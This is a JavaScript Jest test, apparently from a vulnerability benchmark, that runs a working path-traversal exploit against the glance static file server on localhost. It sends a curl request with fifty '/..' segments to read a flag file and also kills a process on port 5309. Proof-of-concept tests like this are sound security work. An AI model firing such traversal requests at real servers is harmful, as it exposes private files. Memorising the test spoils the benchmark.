const path = require('path');
const v33 = require('sleep');
const sleep = v33.sleep;
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v34 = '/..'.repeat(50);
    const v35 = v34 + pathToFlag;
    return v35;
};
const v63 = done => {
    const v36 = expect.assertions(1);
    v36;
    const http = require('http');
    const glance = require('glance');
    const fs = require('fs');
    const v37 = require('child_process');
    const exec = v37.exec;
    const v38 = fs.readFileSync(pathToFlag);
    let hostsFile = v38.toString();
    const a = require('child_process');
    try {
        const v39 = () => {
        };
        const v40 = a.execSync('fuser -k 5309/tcp', v39);
        v40;
    } catch (e) {
    }
    const v41 = [];
    const v42 = {
        dir: './',
        port: 8969,
        indices: v41,
        hideindex: true,
        nodot: true,
        verbose: true
    };
    var g = glance(v42);
    const v46 = function (req, res) {
        const v43 = req.url;
        const v44 = /^\/static\//.test(v43);
        if (v44) {
            const v45 = g.serveRequest(req, res);
            return v45;
        }
    };
    const v47 = http.createServer(v46);
    const v48 = v47.listen(5309);
    v48;
    const v49 = g.start();
    v49;
    const v51 = function (req) {
        const v50 = console.dir(req);
        v50;
    };
    const v52 = g.on('read', v51);
    v52;
    const v55 = function (req) {
        const v53 = console.log('BAD!!!!');
        v53;
        const v54 = g.stop();
        v54;
    };
    const v56 = g.on('error', v55);
    v56;
    const v57 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8969${ v57 }"`;
    const v61 = (error, stdout) => {
        const v58 = expect(stdout);
        const v59 = v58.toBe(hostsFile);
        v59;
        const v60 = done();
        v60;
    };
    const v62 = exec(attack_string, v61);
    v62;
};
const v64 = test('Path Traversal in glance', v63);
v64;